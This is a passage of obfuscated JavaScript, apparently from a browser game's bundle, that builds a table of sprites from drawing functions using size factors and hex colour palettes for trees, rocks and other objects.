			ⵠⲆ[Ⲇ.ⵠⵠᐃⵠⵠⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⲆⵠΔⵠⲆⲆ;
			ⵠⲆ[Ⲇ.ⵠⵠᐃⵠⵠⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠΔΔⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃΔᐃᐃᐃᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃΔᐃᐃᐃᐃⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆΔᐃΔⵠⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃΔᐃᐃᐃᐃⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.Ⲇᐃᐃᐃᐃⵠⵠ;
			ⵠⲆ[Ⲇ.ΔᐃΔⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ΔᐃΔⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔᐃᐃⲆᐃᐃⵠ;
			ⵠⲆ[Ⲇ.ΔᐃΔⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠΔΔΔΔᐃⵠ;
			ⵠⲆ[Ⲇ.ΔⵠⲆⵠⲆⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⲆⵠⲆⵠᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆΔⲆΔⲆⵠ;
			ⵠⲆ[Ⲇ.ΔⵠⲆⵠⲆⵠᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⲆⲆⵠⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⲆⲆΔⲆⲆⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔⵠⵠΔⲆⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆⲆⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⲆΔΔᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆⲆⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔᐃⲆΔⲆⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆΔΔΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆΔΔΔᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃᐃⵠⵠⵠΔⵠ;
			ⵠⲆ[Ⲇ.ⲆΔΔΔᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔⵠⵠⵠΔᐃ;
			ⵠⲆ[Ⲇ.ΔᐃⵠᐃⲆΔⵠ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⵠᐃⲆΔⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⵠΔⲆⵠᐃΔ;
			ⵠⲆ[Ⲇ.ΔᐃⵠᐃⲆΔⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆⲆᐃΔⲆᐃᐃ;
			ⵠⲆ[Ⲇ.ⵠⵠΔⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠΔⵠⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⵠᐃⲆᐃⲆΔ;
			ⵠⲆ[Ⲇ.ⵠⵠΔⵠⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠΔᐃᐃⲆΔ;
			ⵠⲆ[Ⲇ.ΔⲆΔⵠⵠΔⵠ] = [];
			ⵠⲆ[Ⲇ.ΔⲆΔⵠⵠΔⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⵠᐃⵠⲆⵠΔ;
			ⵠⲆ[Ⲇ.ΔⲆΔⵠⵠΔⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⲆⵠⲆΔΔᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃΔⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃΔⲆⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃᐃᐃΔⲆⵠᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃΔⲆⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔⵠᐃⵠⲆⵠ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⲆΔⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⵠΔⵠΔᐃⲆ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⲆΔⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃⲆΔΔⲆᐃΔ;
			ⵠⲆ[Ⲇ.ⵠᐃΔⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃΔⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃΔᐃᐃⲆᐃⲆ;
			ⵠⲆ[Ⲇ.ⵠᐃΔⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔⲆⲆᐃⲆⲆ;
			ⵠⲆ[Ⲇ.ΔⵠⵠⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⵠⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆⵠᐃΔⵠⲆ;
			ⵠⲆ[Ⲇ.ΔⵠⵠⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃⲆⵠⵠⵠᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠΔᐃΔ] = ⲆΔ.ⲆᐃᐃⵠΔᐃΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆᐃ] = [], ⵠⲆ[Ⲇ.ⲆΔᐃⲆᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆᐃᐃᐃⵠΔ(.75 * ᐃ, ᐃΔᐃⵠΔ, [ⵠ[111], ⵠ[387], ⵠ[549], ⵠ[0]]));
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆᐃᐃᐃⵠΔ(.75 * ᐃ, true, [ⵠ[453], ⵠ[533], ⵠ[149], ⵠ[524]]));
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠᐃᐃΔ] = ⵠᐃⵠ(ᐃᐃΔΔᐃⲆΔ(.3 * ᐃ, [ⵠ[473], ⵠ[312]], ᐃΔΔ));
			ⵠⲆ[Ⲇ.ΔⲆⵠⲆΔᐃΔ] = ⵠᐃⵠ(ᐃᐃΔΔᐃⲆΔ(.3 * ᐃ, [ⵠ[473], ⵠ[312]], ⵠΔⵠΔ));
			ⵠⲆ[Ⲇ.ᐃΔᐃⲆⲆΔᐃ] = ⵠᐃⵠ(ᐃⵠΔⵠⲆⲆΔᐃⲆ(.6 * ᐃ, [ⵠ[473], ⵠ[312]]));
			ⵠⲆ[Ⲇ.ⵠⲆⵠᐃⵠⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⵠᐃⵠⵠᐃ].push(ⵠᐃⵠ(ΔΔΔᐃΔ(ᐃ * .7, [ⵠ[473], ⵠ[312], "#165b2b", ⵠ[387], ⵠ[312]], ⵠΔⲆⵠ)));
			ⵠⲆ[Ⲇ.ⵠⲆⵠᐃⵠⵠᐃ].push(ⵠᐃⵠ(ΔΔΔᐃΔ(ᐃ * .7, ["#0b3719", "#228745", "#1a7034", "#614a1a", "#238845"], ΔΔⵠⵠ)));
			ⵠⲆ[Ⲇ.ⵠⲆⵠᐃⵠⵠᐃ].push(ⵠᐃⵠ(ΔΔΔᐃΔ(ᐃ * .7, ["#092a14", "#186733", "#124a23", ⵠ[387], "#1b6735"], 0)));
			ⵠⲆ[Ⲇ.ⵠᐃⵠⲆΔᐃΔ] = [];
			var ᐃⵠ = ⵠᐃⵠ(ΔΔΔᐃΔ(.7 * ᐃ, [ⵠ[556], ⵠ[46], ⵠ[556], "#2e2410", ⵠ[46]], 0));
			ⵠⲆ[Ⲇ.ⵠᐃⵠⲆΔᐃΔ].push(ᐃⵠ);
			ⵠⲆ[Ⲇ.ⵠᐃⵠⲆΔᐃΔ].push(ᐃⵠ);
			ⵠⲆ[Ⲇ.ⵠᐃⵠⲆΔᐃΔ].push(ᐃⵠ);
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆΔⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆΔⵠⵠ].push(ⵠᐃⵠ(ΔΔΔᐃΔ(.7 * ᐃ, [ⵠ[473], ⵠ[312], "#165b2b", ⵠ[387], ⵠ[312]], ΔⵠΔⵠ)));
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆΔⵠⵠ].push(ⵠᐃⵠ(ΔΔΔᐃΔ(ᐃ * .7, ["#0b3719", "#228745", "#1a7034", "#614a1a", "#238845"], ΔⲆⵠ)));
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆΔⵠⵠ].push(ⵠᐃⵠ(ΔΔΔᐃΔ(ᐃ * .7, ["#092a14", "#186733", "#124a23", ⵠ[387], "#1b6735"], ⵠΔᐃ)));
			ⵠⲆ[Ⲇ.ΔⵠΔᐃᐃⵠⵠ] = ⵠᐃⵠ(ⵠⲆΔᐃΔⲆⵠΔᐃ(ᐃ * .3, [ⵠ[210]]));
			ⵠⲆ[Ⲇ.ⲆⵠⵠΔΔΔⵠ] = ⵠᐃⵠ(ⵠᐃᐃⲆΔⲆᐃⲆᐃ(.3 * ᐃ, [ⵠ[210]]));
			ⵠⲆ[Ⲇ.ⵠⵠΔΔΔⵠⵠ] = ⵠᐃⵠ(ᐃᐃΔΔᐃⲆΔ(.4 * ᐃ, [ⵠ[191], ⵠ[210]], 0));
			ⵠⲆ[Ⲇ.ΔⲆⲆᐃᐃⲆⲆ] = ⵠᐃⵠ(ⲆΔⲆΔ(Math.PI / ᐃⲆⵠⵠ, ⵠⵠΔⵠⵠΔᐃΔⵠ(ᐃ * .2, [ⵠ[210]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆΔ] = [], ⵠⲆ[Ⲇ.ⲆⵠΔⲆΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⵠⲆⲆΔᐃΔ(ᐃ * .85, ⲆⵠⲆᐃⲆΔΔ, [ⵠ[111], "#8c55b7", "#652d8e", "#79359e", "#5eccd1", "#4badad", "#9e6ac6"]));
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⵠⲆⲆΔᐃΔ(.85 * ᐃ, ⲆⲆⲆΔⲆ, [ⵠ[111], "#4e4e93", "#393977", "#444187", ⵠ[62], "#277a74", "#7da8db"]));
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆᐃᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆᐃᐃⲆ].push(ⵠᐃⵠ(ΔΔΔᐃΔ(.7 * ᐃ, [ⵠ[556], ⵠ[46], ⵠ[556], "#2e2410", ⵠ[46]], ΔᐃᐃⲆ)));
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆᐃᐃⲆ].push(ⵠᐃⵠ(ΔΔΔᐃΔ(.7 * ᐃ, ["#38130C", "#853D22", "#391402", "#3D3016", "#873E22"], Ⲇᐃⵠ)));
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆᐃᐃⲆ].push(ⵠᐃⵠ(ΔΔΔᐃΔ(ᐃ * .7, ["#1C0A06", "#6B3019", "#1D0A06", "#251D0C", "#6A301A"], ⲆⵠⲆⲆ)));
			ⵠⲆ[Ⲇ.ⲆⵠᐃΔΔ] = [], ⵠⲆ[Ⲇ.ⲆⵠᐃΔΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔⲆΔⲆᐃᐃⵠ(.37 * ᐃ, ⲆⲆⲆΔⲆ, [ⵠ[543], ⵠ[229], ⵠ[319]]));
			ⵠⲆ[Ⲇ.ⲆⵠᐃΔΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔⲆΔⲆᐃᐃⵠ(ᐃ * .37, true, ["#1b1e30", "#161921", "#252f3e"]));
			ⵠⲆ[Ⲇ.ΔᐃᐃΔᐃ] = [], ⵠⲆ[Ⲇ.ΔᐃᐃΔᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃΔΔⲆᐃⵠⵠ(.17 * ᐃ, ᐃᐃⲆᐃᐃ, [ⵠ[543], ⵠ[229], ⵠ[319], "#1b1a25", "#d62c0e"]));
			ⵠⲆ[Ⲇ.ΔᐃᐃΔᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃΔΔⲆᐃⵠⵠ(.17 * ᐃ, true, ["#1b1e30", "#161921", "#252f3e", "#0a0c11", "#d62c0e"]));
			ⵠⲆ[Ⲇ.ᐃΔⲆᐃⲆ] = [], ⵠⲆ[Ⲇ.ᐃΔⲆᐃⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃᐃⵠⵠΔⲆᐃ(ᐃ * .55, ⵠⲆⵠⵠΔ, [ⵠ[337], "#e2e1e1", "#d2cbcb", "#cfcbc8", "#beb5b5", "#ada0a0"], ΔⵠΔⵠ));
			ⵠⲆ[Ⲇ.ᐃΔⲆᐃⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃᐃⵠⵠΔⲆᐃ(ᐃ * .55, ᐃⵠΔᐃΔ, [ⵠ[337], "#216661", "#134945", "#2b8079", "#17504c"], ΔⲆᐃᐃ));
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆᐃ] = [], ⵠⲆ[Ⲇ.ⲆⲆΔⲆᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃᐃⵠⵠΔⲆᐃ(.55 * ᐃ, true, [ⵠ[337], "#8c7654", ⵠ[69], "#a88e6c", ⵠ[69], "#705845"], 0));
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃᐃⵠⵠΔⲆᐃ(ᐃ * .55, ᐃⲆᐃᐃⲆ, [ⵠ[337], "#1b5752", "#0e3b37", "#23706a", "#11413e", "#0b322f"], 0));
			ⵠⲆ[Ⲇ.Ⲇⵠᐃⵠⵠ] = [], ⵠⲆ[Ⲇ.Ⲇⵠᐃⵠⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔᐃⲆΔᐃⵠⵠ(.2 * ᐃ, ΔᐃΔΔⵠ, [ⵠ[111], ⵠ[553], ⵠ[201], ⵠ[359], "#49B669", "#19994C", "#71C187"]));
			ⵠⲆ[Ⲇ.Ⲇⵠᐃⵠⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔᐃⲆΔᐃⵠⵠ(.2 * ᐃ, true, [ⵠ[264], "#114933", "#1b6656", ⵠ[381], "#3db76f", "#118254", "#40c696"]));
			ⵠⲆ[Ⲇ.ᐃΔⵠⲆⲆ] = [], ⵠⲆ[Ⲇ.ᐃΔⵠⲆⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔᐃⲆΔᐃⵠⵠ(ᐃ * .2, true, [ⵠ[111], ⵠ[553], ⵠ[201], ⵠ[359], "#C45727", "#994617", "#DB9358"]));
			ⵠⲆ[Ⲇ.ᐃΔⵠⲆⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔᐃⲆΔᐃⵠⵠ(ᐃ * .2, ΔΔⲆⲆΔ, [ⵠ[264], "#114933", "#1b6656", ⵠ[381], "#69b681", "#509a75", "#7ec387"]));
			ⵠⲆ[Ⲇ.ΔᐃᐃΔΔ] = [], ⵠⲆ[Ⲇ.ΔᐃᐃΔΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔᐃⲆΔᐃⵠⵠ(.2 * ᐃ, ⲆΔΔⲆΔ, [ⵠ[111], ⵠ[553], ⵠ[201], ⵠ[359], "#2792C1", "#196599", "#59C0D8"]));
			ⵠⲆ[Ⲇ.ΔᐃᐃΔΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔᐃⲆΔᐃⵠⵠ(.2 * ᐃ, ᐃⲆᐃᐃⲆ, [ⵠ[264], "#114933", "#1b6656", ⵠ[381], "#19899e", "#16688b", "#4ea3c7"]));
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆ] = [], ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆΔⵠΔⲆᐃ(.24 * ᐃ, ⲆⵠⲆᐃⲆΔΔ, [ⵠ[339], "#b03431", "#94312d", "#bd3c33", ⵠ[281]]));
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆΔⵠΔⲆᐃ(.24 * ᐃ, ᐃⵠΔᐃΔ, [ⵠ[339], "#1b103e", "#190f3b", "#261a4e", ⵠ[241]]));
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⵠ] = [], ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆⵠᐃΔⲆᐃ(.32 * ᐃ, true, [ⵠ[111], "#cae9eb", "#75bcae", ⵠ[407], "#51736d", "#2b4d48", "#1b3a3a", "#80ccca", "#59ada7"]));
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆⵠᐃΔⲆᐃ(.32 * ᐃ, true, [ⵠ[111], "#70c1d6", "#49b2cf", "#87cad9", "#367c93", "#113743", "#0c2c36", "#51a2b8", "#3a8ea4"]));
			ⵠⲆ[Ⲇ.ᐃⲆⲆᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⲆᐃⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ᐃᐃⲆⲆ, ⵠⵠⵠΔᐃΔⵠ(.9 * ᐃ, ΔᐃⲆⵠⵠ, [ⵠ[111], "#284c4a", "#193533", "#c8efef", "#7eccbb"])));
			ⵠⲆ[Ⲇ.ᐃⲆⲆᐃⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ⵠⵠⵠΔᐃΔⵠ(ᐃ * .9, ⲆⵠⵠᐃⲆ, [ⵠ[111], "#18332e", "#112320", ⵠ[385], "#49b2cf"])));
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃⵠⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃⵠⵠΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ΔΔⵠΔ, ⵠⵠⵠΔᐃΔⵠ(ᐃ * ᐃⲆᐃ, true, [ΔⵠⲆᐃΔ, undefined, undefined, "#c8efef", "#c8efef"])));
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃⵠⵠΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⵠⲆΔⵠΔ, ⵠⵠⵠΔᐃΔⵠ(1 * ᐃ, ΔᐃΔΔⵠ, [ⲆⲆⲆⵠⵠ, undefined, ᐃᐃⵠᐃᐃ, ⵠ[385], ⵠ[385]])));
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔⵠΔΔ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔⵠΔΔ].push(ⵠᐃⵠ(ⲆᐃΔᐃΔᐃⵠ(.3 * ᐃ, ⵠᐃⲆᐃΔ, [ⵠ[111], ⵠ[79], ⵠ[379], "#704821", ⵠ[404], ⵠ[530]], 0)));
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔⵠΔΔ].push(ⵠᐃⵠ(ⲆᐃΔᐃΔᐃⵠ(ᐃ * .3, ᐃΔᐃⵠΔ, [ⵠ[111], ⵠ[79], ⵠ[379], "#704821", ⵠ[404], ⵠ[530]], 1)));
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔⵠΔΔ].push(ⵠᐃⵠ(ⲆᐃΔᐃΔᐃⵠ(.3 * ᐃ, ⵠⲆΔᐃⲆ, [ⵠ[111], ⵠ[79], ⵠ[379], "#704821", ⵠ[404], ⵠ[38]], ⵠⲆΔ)));
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔΔⲆ].push(ⵠᐃⵠ(ΔΔⲆΔⵠᐃᐃ(.7 * ᐃ, [ⵠ[79], ⵠ[379], "#85592c", ⵠ[530]], 0)));
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔΔⲆ].push(ⵠᐃⵠ(ΔΔⲆΔⵠᐃᐃ(ᐃ * .7, [ⵠ[79], ⵠ[379], "#85592c", ⵠ[530]], ⵠᐃⵠΔ)));
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔΔⲆ].push(ⵠᐃⵠ(ΔΔⲆΔⵠᐃᐃ(.7 * ᐃ, [ⵠ[79], ⵠ[379], "#85592c", ⵠ[530]], 1)));
			ⵠⲆ[Ⲇ.ⵠᐃⵠⵠΔᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃⵠⵠΔᐃᐃ].push(ⵠᐃⵠ(ⲆᐃⲆⵠᐃⲆⲆ(ᐃ * .4, [ⵠ[111], ⵠ[79], ⵠ[379], ⵠ[530]], 0, 1)));
			ⵠⲆ[Ⲇ.ⵠᐃⵠⵠΔᐃᐃ].push(ⵠᐃⵠ(ⲆᐃⲆⵠᐃⲆⲆ(.4 * ᐃ, [ⵠ[111], ⵠ[79], ⵠ[379], ⵠ[530]], ᐃᐃⵠ, ᐃⲆᐃ)));
			ⵠⲆ[Ⲇ.ⵠᐃⵠⵠΔᐃᐃ].push(ⵠᐃⵠ(ⲆᐃⲆⵠᐃⲆⲆ(ᐃ * .4, [ⵠ[111], ⵠ[79], ⵠ[379], ⵠ[38]], 1, ΔΔΔ)));
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⲆᐃ].push(ⵠᐃⵠ(ⲆᐃⲆⵠᐃⲆⲆ(ᐃ * .4, [ⵠ[111], ⵠ[79], ⵠ[379], ⵠ[530]], 0, ⵠⲆⲆ)));
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⲆᐃ].push(ⵠᐃⵠ(ⲆᐃⲆⵠᐃⲆⲆ(ᐃ * .4, [ⵠ[111], ⵠ[79], ⵠ[379], ⵠ[530]], 1, 0)));
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⲆᐃ].push(ⵠᐃⵠ(ⲆᐃⲆⵠᐃⲆⲆ(ᐃ * .4, [ⵠ[111], ⵠ[79], ⵠ[379], ⵠ[38]], 1, ΔᐃΔΔ)));
			ⵠⲆ[Ⲇ.ΔⵠⵠΔᐃ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⵠΔᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, Δᐃᐃᐃⵠ(.7 * ᐃ, ⵠᐃⲆᐃΔ, [ⵠ[111], "#6d5041", "#4f3d35", ⵠ[24], ⵠ[237], "#757575"])));
			ⵠⲆ[Ⲇ.ΔⵠⵠΔᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, Δᐃᐃᐃⵠ(ᐃ * .7, true, [ⵠ[111], ⵠ[533], ⵠ[2], ⵠ[252], ⵠ[132], "#274352"])));
			ⵠⲆ[Ⲇ.ΔΔⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔΔⲆⵠΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⲆΔⵠⵠ, Δᐃᐃᐃⵠ(.7 * ᐃ, true, [ⵠ[111], ⵠ[400], ⵠ[330], ⵠ[104], ⵠ[193], "#ada437"])));
			ⵠⲆ[Ⲇ.ΔΔⲆⵠΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, Δᐃᐃᐃⵠ(.7 * ᐃ, ΔΔⲆⲆΔ, [ⵠ[111], ⵠ[181], ⵠ[103], ⵠ[561], ⵠ[174], "#32916c"])));
			ⵠⲆ[Ⲇ.ⵠᐃΔΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃΔΔᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ᐃᐃⲆⲆ, Δᐃᐃᐃⵠ(ᐃ * .7, ᐃᐃⲆᐃᐃ, [ⵠ[111], ⵠ[435], ⵠ[76], ⵠ[226], ⵠ[448], "#42aab8"])));
			ⵠⲆ[Ⲇ.ⵠᐃΔΔᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, Δᐃᐃᐃⵠ(.7 * ᐃ, true, [ⵠ[111], ⵠ[522], ⵠ[357], ⵠ[74], ⵠ[102], "#49bdc6"])));
			ⵠⲆ[Ⲇ.ⵠᐃᐃⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃᐃⲆΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, Δᐃᐃᐃⵠ(.7 * ᐃ, true, [ⵠ[111], ⵠ[435], ⵠ[76], ⵠ[525], ⵠ[116], "#9641b5"])));
			ⵠⲆ[Ⲇ.ⵠᐃᐃⲆΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ᐃᐃⵠⲆᐃ, Δᐃᐃᐃⵠ(ᐃ * .7, true, [ⵠ[111], ⵠ[522], ⵠ[357], ⵠ[436], ⵠ[459], "#6f45c2"])));
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⵠⲆ].push(ⵠᐃⵠ(ᐃⲆᐃⵠΔⵠΔ(.7 * ᐃ, ["#3b330d", "#b5a118", "#c8ac16"], ᐃΔΔ)));
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⵠⲆ].push(ⵠᐃⵠ(ᐃⲆᐃⵠΔⵠΔ(.7 * ᐃ, ["#524712", "#c7b11c", "#d9ba18"], 0)));
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⵠⲆ].push(ⵠᐃⵠ(ᐃⲆᐃⵠΔⵠΔ(ᐃ * .7, ["#2a2409", "#9f8e14", "#ad9511"], ᐃⵠⲆⵠ)));
			ⵠⲆ[Ⲇ.ⲆⲆⲆⵠⲆΔⲆ] = ⵠᐃⵠ(ΔⲆⵠΔᐃᐃⵠⵠⵠ(1.1 * ᐃ, [ⵠ[212]]));
			ⵠⲆ[Ⲇ.ᐃᐃᐃΔΔΔΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(Math.PI, ⵠᐃⵠΔⲆᐃᐃⵠᐃ(.9 * ᐃ, ⵠ[212])));
			ⵠⲆ[Ⲇ.ΔⵠⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⲆⵠΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃΔⲆⲆᐃᐃⵠ(.55 * ᐃ, true, ["#c9a65f", "#ae863f", "#655530", "#4a391c", "#ebdd79", "#4a421c"]));
			ⵠⲆ[Ⲇ.ΔⵠⲆⵠΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃΔⲆⲆᐃᐃⵠ(.55 * ᐃ, ⲆΔΔⲆΔ, [ⵠ[548], "#0f3f3d", ⵠ[351], "#0d2d2b", ⵠ[402], "#070d16"]));
			ⵠⲆ[Ⲇ.ᐃⵠⵠⲆΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⵠⲆΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆⵠΔᐃΔΔ(ᐃ * .55, ⲆΔΔⲆΔ, [ⵠ[93], ⵠ[48], "#573f29", ⵠ[563]]));
			ⵠⲆ[Ⲇ.ᐃⵠⵠⲆΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆⵠΔᐃΔΔ(.55 * ᐃ, true, ["#0d3b39", "#144642", "#0b3230", "#154f4b"]));
			ⵠⲆ[Ⲇ.ⵠΔΔᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠΔΔᐃⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃⲆᐃⵠⵠᐃΔ(ᐃ * .6, true, [ⵠ[93], "#808080", "#4a4a4a", "#9e9c8b", "#615c53", "#686969", "#8a8776", ⵠ[536], "#747474", "#969696", ⵠ[265]]));
